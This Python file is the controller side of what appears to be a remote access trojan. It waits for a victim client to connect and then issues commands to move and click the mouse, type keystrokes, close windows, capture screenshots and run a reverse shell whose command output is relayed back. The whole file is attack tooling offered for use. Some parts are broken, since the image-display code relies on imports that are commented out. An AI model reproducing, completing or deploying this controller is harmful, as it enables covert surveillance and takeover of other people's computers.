#from tkinter import*
import socket
import time
#import PIL.Image as image
#from PIL import ImageTk
import sys
from io import BytesIO
import Styling as st

HOST= '127.0.0.1'
PORT= 4044
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SERVER=((HOST, PORT))
s.bind(SERVER)
s.listen(5)


help=["size:\n  getclient screen size",
     "mouse:\n  get cursor position",
     "move:\n  move cursor to point (x,y)",
     "doubleclick:\n  double click current cursor position",
     "click:\n  click current cursor position",
     "rightclick:\n  right click current cursor position",
     "write:\n  write string on screen",
     "press:\n  press keyboard key",
     "hotkey:\n  compination of keyboard keys",
     "minimize:\n  resize current client's window (-)",
     "maximize:\n  resize current client's window (+)",
     "close:\n  close current client's window",
     "alert:\n  display warning box with custom message",
     "scroll:\n  scroll screen in distance(+,for upward scroll and -,for downward scroll)",
     "locate:\n  locate object on image on screen, returns none if not found",
     "takeshot:\n  take screenshot of current client's screen and displays it",
     "shell:\n  start reverse shell"
     ]

LOG=["screen",
     "mouse",
     "move",
     "doubleclick",
     "click",
     "rightclick",
     "write",
     "press",
     "hotkey",
     "minimize",
     "maximize",
     "close",
     "alert",
     "scroll",
     "locate",
     "takeshots",
     "shell",
     "help",
     "exit"
    ]
#recieve full image
def recvall(size):
	buffsize=4019
	data=b''
	while len(data)< size:
	    chunk=conn.recv(buffsize)
	    data +=chunk
	
	return data
##load full image
def load(size):
	buffsize=4019
	data=b''
	while len(data)< size:
	    chunk=conn.recv(buffsize)
	    data +=chunk
	    recv_len=len(data)
	    while True:
	    	percent=(recv_len/size)*100
	    	#print(percent)
	 		
##takeshots
def shots():
    x= 1
    log="takeshots"
    log=log.encode("utf-8")
    conn.sendall(log)
    info=conn.recv(1024)
    info=info.decode("utf-8")
    st.style_shell(info)
    time.sleep(0.5)
    size=conn.recv(1024)
    size=size.decode("utf-8")
    st.style_shell(f'recieved image size :{size}bytes')
    size=int(size)
    img=recvall(size)
    st.style_success("[+]~image recieved")
    st.style_success("[++]~showing image..")
    img=image.open(BytesIO(img))
    path= f'/home/pi/Desktop/client_screen/image{x}.png'
    #img=img.save(path)
    root=Tk()
    #shot=image.open(img)
    shot=ImageTk.PhotoImage(img)
    image_box=Label(root, image=shot)
    image_box.pack()
    st.style_alert("[**]~image displayed in new window")
    time.sleep(0.2)
    run()

#send and recieve shell commands	
def shell():
    st.style_rev()
    cmd=input("~$:")
    if cmd=="exit":
        conn.sendall((cmd).encode("utf-8"))
        data=conn.recv(1024)
        st.style_shell(data.decode("utf-8"))
        run()
    else:
        conn.sendall((cmd).encode("utf-8"))
        time.sleep(0.5)
        dataa=conn.recv(1024)
        dataa=dataa.decode("utf-8")
       	st.style_shell(dataa)

    shell()

	
def run():
    log=input("[#]~")
    #if input is empty
    if len(log)<1:
        run()
    #if invalid command
    #elif log not in LOG:
        #print("[**]~invalid input, try again")
        #run()
      #takeshots
    elif log=="takeshots":
        shots()	

       #close server
    elif log=="exit":
         st.style_alert("CONNECTION SABATOGE\nclosing clients socket..")
         time.sleep(0.5)
         sys.exit("client's socket closed\nexiting system now")
    elif log=="help":
        st.style_logo("\n[*]............MAN PAGE............")
        for i in help:
            st.style_success(f'>>{i}')
        st.style_logo("[*]............END............")
        run()

    ##starting reverse shell
    elif log=="shell":
        conn.sendall(log.encode("utf-8"))
        data=conn.recv(1024)
        data=data.decode("utf-8")
        st.style_shell(data)
        shell()
    else:
        log=log.encode("utf-8")
        conn.sendall(log)
        info=conn.recv(1024)
        st.style_alert(info.decode("utf-8"))
        run()
		
st.style_logo("\twaiting for connection")
conn, addr= s.accept()
if True:
      st.style_alert("||~connection is active~||")

while True:
      run()
